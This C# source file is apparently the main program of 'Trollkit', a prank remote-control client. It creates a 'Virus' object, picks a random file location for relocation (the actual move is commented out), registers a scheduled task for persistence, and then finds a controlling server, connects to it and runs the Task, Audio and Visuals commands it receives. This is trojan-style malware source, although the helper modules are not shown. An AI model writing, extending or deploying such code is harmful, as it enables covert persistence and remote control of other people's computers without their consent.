using System;
using System.Collections.Generic;
using System.Net.Sockets;
using System.Threading.Tasks;
using Trollkit_Client.Modules;
using Trollkit_Client.Modules.CommandHandlers;
using Trollkit_Library;
using Trollkit_Library.ClientModules;
using Trollkit_Library.Models;
using Trollkit_Library.Modules;

namespace Trollkit_Client
{
	class Program
	{
		private ClientDiscovery discover;
		private ClientReceiver receiver;
		public Dictionary<string,ICommandHandler> handlers;

		static void Main(string[] args)
		{
			
			if (args.Length > 0)
				if(args[0] == "move-completed")
				{
					BConsole.WriteLine("Application has been moved to a different location...");
					var program = new Program();
					var addresses = program.discover.GetIpAddresses();
					string ip = program.discover.GetRemoteServerIp(addresses);

					Task.Run(() => {
						program.receiver.ConnectAndReceive(ip);
					});

					Console.ReadLine();
					TransferCommandObject returnObject = new TransferCommandObject
					{ Command = "Debug" };
					program.receiver.SendCommandObjectToSocket(ClientServerPipeline.BufferSerialize(returnObject));

					Console.Read();
					return;
				}


			Virus virus = new Virus();
			string randomLocation = virus.FindRandomFileLocation();
			string newFileLocation = "lekker";// virus.MoveFileToLocation(randomLocation);
			BConsole.WriteLine($"New File location: {newFileLocation}");
			new TaskSchedulerHelper().CreateTask(newFileLocation);

			Console.Read();
		}

		public Program()
		{
			discover = new ClientDiscovery("gang?", "Dopple gang");
			receiver = new ClientReceiver();
			receiver.OnDataReceived += Receiver_OnDataReceived;
			handlers = new Dictionary<string,ICommandHandler>();
			handlers.Add("Task", new TaskHandler());
			handlers.Add("Audio", new AudioHandler());
			handlers.Add("Visuals", new VisualsHandler());
		}

		private void Receiver_OnDataReceived(Socket s, TransferCommandObject Object)
		{
			if(handlers.ContainsKey(Object.Handler))
			{
				handlers[Object.Handler].HandleCommand(Object);
			}
		}
	}
}
